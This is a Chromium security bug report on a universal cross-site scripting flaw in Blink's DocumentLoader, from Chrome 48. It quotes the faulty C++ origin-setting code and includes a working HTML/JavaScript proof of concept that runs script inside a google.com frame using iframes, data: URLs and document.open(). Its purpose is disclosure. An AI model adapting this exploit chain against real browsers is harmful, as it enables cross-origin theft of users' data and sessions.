# UXSS in DocumentLoader::createWriterFor

#### Reported by <mailto:dcheng@chromium.org>, Feb 2 2016

### Details:

`third_party/WebKit/Source/core/loader/DocumentLoader.cpp:735`:

```cpp
PassRefPtrWillBeRawPtr<DocumentWriter> DocumentLoader::createWriterFor(const Document ownerDocument, const DocumentInit& init,
const AtomicString& mimeType, const AtomicString& encoding, bool dispatch, ParserSynchronizationPolicy parsingPolicy)
{
    LocalFrame* frame = init.frame();

    ASSERT(!frame->document() || !frame->document()->isActive());
    ASSERT(frame->tree().childCount() == 0);

    if (!init.shouldReuseDefaultView())
        frame->setDOMWindow(LocalDOMWindow::create(*frame));

    RefPtrWillBeRawPtr<Document> document = frame->localDOMWindow()->installNewDocument(mimeType, init);
    if (ownerDocument) {
        document->setCookieURL(ownerDocument->cookieURL());
        document->setSecurityOrigin(ownerDocument->securityOrigin());
      }
    }
```

DocumentLoader calls `setSecurityOrigin` instead of `updateSecurityOrigin`, so while the document inherits the correct SecurityOrigin
from the owner, its associated v8 context is left with the old security token which is used for access checks.

### Repro:
```html
<body>
<script>
var frame = document.body.appendChild(document.createElement("iframe"));
frame.src = "https://www.google.com/intl/en/ads/";
frame.onload = function () {
    frame.onload = null;
    frame.contentWindow.frames[0].location = "data:text/html,<script>(" + function () {
        frame = document.documentElement.appendChild(document.createElement("iframe"));
        frame.contentWindow.setTimeout("parent.document.open()", 0);
        setTimeout(function () { location = "javascript:'<script>parent.eval(\"alert(location)\")</scr" + "ipt>'" }, 0);
    } + "())</scr" + "ipt>";
}
</script>
</body>
```
Note the `document.open()` call in the repro is used to set the document URL to "about:blank" which forces the javascript: generated document to inherit the origin from the parent frame's document.


Version: Chrome 48 stable
Link: https://bugs.chromium.org/p/chromium/issues/detail?id=583445
